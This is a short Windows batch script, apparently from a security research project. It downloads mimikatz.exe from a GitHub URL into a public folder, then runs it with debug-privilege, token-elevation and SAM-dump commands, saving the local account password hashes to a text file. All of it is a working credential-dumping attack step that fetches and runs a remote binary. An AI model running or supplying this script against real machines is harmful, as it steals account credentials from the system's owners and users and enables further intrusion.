@echo off
setlocal ENABLEDELAYEDEXPANSION

REM Paths and URL
set "ExePath=C:\Users\Public\mimikatz.exe"
set "OutPath=C:\Users\Public\mimi_output.txt"
set "Url=https://github.com/Reiya-cyber/ResearchProject/raw/refs/heads/main/Original/Resources/mimikatz.exe"

REM Download if missing
if not exist "%ExePath%" (
    powershell -Command "Invoke-WebRequest -Uri '%Url%' -OutFile '%ExePath%' -UseBasicParsing"
)


(
%ExePath% privilege::debug token::elevate lsadump::sam exit 
) > "%OutPath%"

endlocal
